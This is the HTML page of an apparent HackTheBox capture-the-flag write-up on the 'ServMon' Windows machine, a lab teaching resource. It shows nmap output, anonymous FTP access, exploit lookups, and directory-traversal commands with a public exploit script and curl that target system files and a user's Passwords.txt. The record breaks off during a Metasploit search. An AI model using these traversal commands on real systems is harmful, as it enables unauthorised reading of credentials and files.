@@ -1,0 +1,460 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ServMon | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="ServMon HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/servmon/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/servmon/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ServMon "><meta property="og:description" content="ServMon HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/servmon/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png"><meta name=twitter:title content="ServMon "><meta name=twitter:description content="ServMon HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ServMon ","item":"https://s4ch.github.io/writeups/hackthebox/servmon/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ServMon ","name":"ServMon ","description":"ServMon HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"≡ƒÆó Info Name: ServMon Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview TL;DR: We have to find some hints in a FTP, finds creds through a Path Traversal in NVMS-1000 and gain a low privilege shell, then we pe via NSClient++ to get admin RCE.\nInstall tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap\texploitdb smbclient filezilla dos2unix curl metasploit Network Enumeration Let’s start with a nmap scan to find open ports and identify services:\n$ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST Nmap scan report for 10.10.10.184 Host is up (0.020s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"\u003e | | | | | | | | | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5040/tcp open unknown 5666/tcp open tcpwrapped 6063/tcp open x11? 6699/tcp open napster? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers | jobs | submitted | errors | threads |_ ini\"}}]} | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r SF:(NULL,6B,\"HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20te SF:xt/html\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x2 SF:0\\r\\n\\r\\n\")%r(GetRequest,1B4,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x SF:20text/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthIn SF:fo:\\x20\\r\\n\\r\\n\\xef\\xbb\\xbf\u003c!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\"-//W3C//DTD SF:\\x20XHTML\\x201\\.0\\x20Transitional//EN\\\"\\x20\\\"http://www\\.w3\\.org/TR/xht SF:ml1/DTD/xhtml1-transitional\\.dtd\\\"\u003e\\r\\n\\r\\n","wordCount":"2521","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png","datePublished":"2020-06-20T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/servmon/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">ServMon</h1><div class=post-description>ServMon HackTheBox writeup</div><div class=post-meta><span title='2020-06-20 00:00:00 +0000 UTC'>June 20, 2020</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2521 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/servmon/servmon.png alt="ServMon HackTheBox Machine"><p>ServMon - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#network-reconnaissance-ftp>Network reconnaissance: FTP</a></li><li><a href=#network-reconnaissance-http>Network reconnaissance: HTTP</a></li><li><a href=#network-reconnaissance-smb>Network reconnaissance: SMB</a></li><li><a href=#network-reconnaissance-ftp-lets-go-back>Network reconnaissance: FTP (let&rsquo;s go back)</a></li><li><a href=#network-reconnaissance-http-lets-go-back>Network reconnaissance: HTTP (let&rsquo;s go back)</a></li><li><a href=#network-exploitation-ssh>Network exploitation: SSH</a></li><li><a href=#privilege-escalation--through-nsclient-nadine-to-nt-authoritysystem>Privilege Escalation through NSClient++: Nadine to NT Authority\SYSTEM</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> ServMon</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/240>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>: We have to find some hints in a FTP, finds creds through a Path
+Traversal in NVMS-1000 and gain a low privilege shell, then we pe via
+NSClient++ to get admin RCE.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap	exploitdb smbclient filezilla dos2unix curl metasploit
+</code></pre><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Let&rsquo;s start with a <a href=https://nmap.org/>nmap</a> scan to find open ports and identify services:</p><pre tabindex=0><code>$ sudo nmap -sSVC -p- 10.10.10.184 -oA nmap_full
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 15:56 CEST
+Nmap scan report for 10.10.10.184
+Host is up (0.020s latency).
+Not shown: 65517 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_01-18-20  12:05PM       &lt;DIR&gt;          Users
+| ftp-syst:
+|_  SYST: Windows_NT
+22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
+|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
+|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
+80/tcp    open  http
+| fingerprint-strings:
+|   GetRequest, HTTPOptions, RTSPRequest:
+|     HTTP/1.1 200 OK
+|     Content-type: text/html
+|     Content-Length: 340
+|     Connection: close
+|     AuthInfo:
+|     &lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;&gt;
+|     &lt;html xmlns=&#34;http://www.w3.org/1999/xhtml&#34;&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;&lt;/title&gt;
+|     &lt;script type=&#34;text/javascript&#34;&gt;
+|     window.location.href = &#34;Pages/login.htm&#34;;
+|     &lt;/script&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   NULL:
+|     HTTP/1.1 408 Request Timeout
+|     Content-type: text/html
+|     Content-Length: 0
+|     Connection: close
+|_    AuthInfo:
+|_http-title: Site doesn&#39;t have a title (text/html).
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+5666/tcp  open  tcpwrapped
+6063/tcp  open  x11?
+6699/tcp  open  napster?
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings:
+|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
+|     HTTP/1.1 404
+|     Content-Length: 18
+|     Document not found
+|   GetRequest:
+|     HTTP/1.1 302
+|     Content-Length: 0
+|     Location: /index.html
+|     workers
+|     jobs
+|     submitted
+|     errors
+|     threads
+|_    ini&#34;}}]}
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2020-01-14T13:24:20
+|_Not valid after:  2021-01-13T13:24:20
+|_ssl-date: TLS randomness does not represent time
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.80%I=7%D=6/11%Time=5EE2385B%P=x86_64-unknown-linux-gnu%r
+SF:(NULL,6B,&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20te
+SF:xt/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x2
+SF:0\r\n\r\n&#34;)%r(GetRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x
+SF:20text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthIn
+SF:fo:\x20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD
+SF:\x20XHTML\x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xht
+SF:ml1/DTD/xhtml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\
+SF:.w3\.org/1999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n
+SF:\x20\x20\x20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r
+SF:\n\x20\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\
+SF:r\n&#34;)%r(HTTPOptions,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
+SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
+SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20X
+SF:HTML\x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/D
+SF:TD/xhtml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.
+SF:org/1999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\
+SF:x20\x20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20
+SF:\x20\x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x2
+SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;)
+SF:%r(RTSPRequest,1B4,&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
+SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
+SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\&#34;-//W3C//DTD\x20XHTML\
+SF:x201\.0\x20Transitional//EN\&#34;\x20\&#34;http://www\.w3\.org/TR/xhtml1/DTD/xh
+SF:tml1-transitional\.dtd\&#34;&gt;\r\n\r\n&lt;html\x20xmlns=\&#34;http://www\.w3\.org/1
+SF:999/xhtml\&#34;&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x
+SF:20\x20&lt;script\x20type=\&#34;text/javascript\&#34;&gt;\r\n\x20\x20\x20\x20\x20\x20\
+SF:x20\x20window\.location\.href\x20=\x20\&#34;Pages/login\.htm\&#34;;\r\n\x20\x20
+SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/11%Time=5EE23864%P=x86_64-unknown-lin
+SF:ux-gnu%r(GetRequest,AE,&#34;HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLoc
+SF:ation:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
+SF:0\0\0\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12
+SF:\x03\x18\xc0\x03\x12\x10\n\tsubmitted\x12\x03\x18\xbf\x03\x12\x0c\n\x06
+SF:errors\x12\x02\x18\0\x12\r\n\x07threads\x12\x02\x18\x01\0ini\&#34;}}\]}\0\0
+SF:\0&#34;)%r(HTTPOptions,36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\
+SF:nDocument\x20not\x20found&#34;)%r(FourOhFourRequest,36,&#34;HTTP/1\.1\x20404\r\
+SF:nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found&#34;)%r(RTSPRequest,
+SF:36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x2
+SF:0found&#34;)%r(SIPOptions,36,&#34;HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n
+SF:\r\nDocument\x20not\x20found&#34;);
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m15s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-06-11T14:04:39
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 235.93 seconds
+</code></pre><p>We want to look at FTP (21), Web servers (80 & 8443) and Samba (139,445) first.</p><h3 id=network-reconnaissance-ftp>Network reconnaissance: FTP<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-ftp>#</a></h3><p><a href=https://nmap.org/>Nmap</a> told us it was possible to connect to FTP anonymously but found nothing to
+list so let&rsquo;s try ourselves:</p><pre tabindex=0><code>$ ftp 10.10.10.184
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name (10.10.10.184:cyfun): Anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls -a
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:05PM       &lt;DIR&gt;          Users
+226 Transfer complete.
+</code></pre><p>But there is nothing (or I thought so).</p><h3 id=network-reconnaissance-http>Network reconnaissance: HTTP<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-http>#</a></h3><ul><li><p>port 80: <strong>NVMS-1000</strong> http://10.10.10.184/Pages/login.htm</p></li><li><p>port 8443: <strong>NSClient++</strong> https://10.10.10.184:8443/index.html</p></li></ul><p>Both services are asking for credentials but we have none yet.
+Let&rsquo;s see if they are vulnerable in a first place.</p><h4 id=nsclient>NSClient++<a hidden class=anchor aria-hidden=true href=#nsclient>#</a></h4><p>Let&rsquo;s look for a <code>NSClient++</code> exploit:</p><pre tabindex=0><code>$ searchsploit --id NSClient
+--------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                     |  EDB-ID
+--------------------------------------------------------------------------------------------------- ---------------------------------
+NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                          | 48360
+NSClient++ 0.5.2.35 - Privilege Escalation                                                         | 46802
+--------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+$ searchsploit -p 46802
+  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/46802
+     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
+File Type: ASCII text, with very long lines, with CRLF line terminators
+</code></pre><p><strong>Hypothesis:</strong></p><p>Once we have a low privileged shell it will be possible to run a command
+(<code>nscp web -- password --display</code>) or read the config of NSClient++ to retrieve
+a user password. Usually NSClient++ run as privileged user so with an app user
+we could create some tasks that will be run by the app daemon and gain more
+privileges.</p><h4 id=nvms-1000>NVMS-1000<a hidden class=anchor aria-hidden=true href=#nvms-1000>#</a></h4><p>Let&rsquo;s look for a <code>NVMS-1000</code> exploit:</p><pre tabindex=0><code>$ searchsploit --id NVMS 1000
+--------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                     |  EDB-ID
+--------------------------------------------------------------------------------------------------- ---------------------------------
+NVMS 1000 - Directory Traversal                                                                    | 47774
+TVT NVMS 1000 - Directory Traversal                                                                | 48311
+--------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+$ searchsploit -p 47774
+  Exploit: NVMS 1000 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/47774
+     Path: /usr/share/exploitdb/exploits/hardware/webapps/47774.txt
+File Type: UTF-8 Unicode text, with CRLF line terminators
+
+$ searchsploit -p 48311
+  Exploit: TVT NVMS 1000 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/48311
+     Path: /usr/share/exploitdb/exploits/hardware/webapps/48311.py
+File Type: UTF-8 Unicode text, with CRLF line terminators
+</code></pre><p>So let&rsquo;s see if the directory traversal works, I have to use <code>dos2unix</code> to
+convert CRLF to LF (Windows to Linux).</p><pre tabindex=0><code>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 -
+dos2unix: active code page: 0
+
+Usage : python exploit.py url filename outputname
+Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini
+
+$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ windows/win.ini win.ini
+dos2unix: active code page: 0
+Host not vulnerable to Directory Traversal!
+</code></pre><p>It failed but maybe because <code>C:\windows\win.ini</code> doesn&rsquo;t exist. Let&rsquo;s try with
+something more reliable like the host file.</p><pre tabindex=0><code>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Windows/System32/drivers/etc/hosts hosts.txt
+dos2unix: active code page: 0
+
+Directory Traversal Succeeded
+
+Saving Output
+
+$ cat hosts.txt
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;response&gt;      &lt;status&gt;fail&lt;/status&gt;
+        &lt;errorCode&gt;536870934&lt;/errorCode&gt;
+&lt;/response&gt;
+</code></pre><p>It&rsquo;s a false positive occurring when there isn&rsquo;t an file extension.
+(At first glance it&rsquo;s seems the exploit is not working or the server is
+not vulnerable).</p><h3 id=network-reconnaissance-smb>Network reconnaissance: SMB<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-smb>#</a></h3><p>From <a href=https://nmap.org/>Nmap</a> script it&rsquo;s it is SMBv2 but we can&rsquo;t list any shares:</p><pre tabindex=0><code>$ smbclient -L 10.10.10.184 -N
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre><p>As I said in <a href=https://blog.raw.pm/en/hackthebox-nest-write-up/#Network-Enumeration-finding-TempUser>Nest </a>,</p><blockquote><p>CrackMapExec, smb-enum-shares.nse and enum4linux don&rsquo;t find any shares because they support only SMB v1 that is disabled.</p><p>But smbclient and msf modules works. So let&rsquo;s start <a href=https://www.metasploit.com/>metasploit</a> console (msfconsole).</p></blockquote><pre tabindex=0><code>msf5 auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.184
+RHOSTS =&gt; 10.10.10.184
+msf5 auxiliary(scanner/smb/smb_enumshares) &gt; run
+
+[-] 10.10.10.184:139      - Login Failed: Unable to Negotiate with remote host
+[*] 10.10.10.184:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre><p>MSF can&rsquo;t list shares either. Let&rsquo;s verify it is supporting SMBv2:</p><pre tabindex=0><code>msf5 auxiliary(scanner/smb/smb2) &gt; set RHOSTS 10.10.10.184
+RHOSTS =&gt; 10.10.10.184
+msf5 auxiliary(scanner/smb/smb2) &gt; run
+
+[+] 10.10.10.184:445      - 10.10.10.184 supports SMB 2 [dialect 255.2] and has been online for 3676767 hours
+[*] 10.10.10.184:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre><h3 id=network-reconnaissance-ftp-lets-go-back>Network reconnaissance: FTP (let&rsquo;s go back)<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-ftp-lets-go-back>#</a></h3><p>As we saw earlier with <code>ftp</code> CLI we didn&rsquo;t see anything.
+But I tried again with FileZilla and saw two folders this time, with a file in
+each:</p><ul><li><code>Nadine/Confidential.txt</code></li><li><code>Nathan/Notes to do.txt</code></li></ul><p><code>Confidential.txt</code></p><pre tabindex=0><code>Nathan,
+
+I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+</code></pre><p><code>Notes to do.txt</code></p><pre tabindex=0><code>1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+</code></pre><h3 id=network-reconnaissance-http-lets-go-back>Network reconnaissance: HTTP (let&rsquo;s go back)<a hidden class=anchor aria-hidden=true href=#network-reconnaissance-http-lets-go-back>#</a></h3><p>Let&rsquo;s use <code>NVMS-1000</code> path traversal again but this time with:
+<code>Users/Nathan/Desktop/Passwords.txt</code> thanks to the information we got on the FTP.</p><pre tabindex=0><code>$ cat /usr/share/exploitdb/exploits/hardware/webapps/48311.py | dos2unix -c iso -q | python2 - http://10.10.10.184/ Users/Nathan/Desktop/Passwords.txt passwords.txt
+dos2unix: active code page: 0
+Host not vulnerable to Directory Traversal!
+</code></pre><p>No file but we are sure it&rsquo;s here. This exploit looks bad so it may be broken.</p><p>With curl no result either:</p><pre tabindex=0><code>$ curl &#39;http://10.10.10.184/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt&#39; --head
+HTTP/1.1 404 Not Found
+Content-type: text/html
+Content-Length: 0
+Connection: close
+AuthInfo:
+</code></pre><p>But with <a href=https://www.metasploit.com/>metasploit</a> we get the file (WTF):</p><pre tabindex=0><code>msf5 &gt; search NVMS
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank    Check  Description
+   -  ----                                       ---------------  ----    -----  -----------
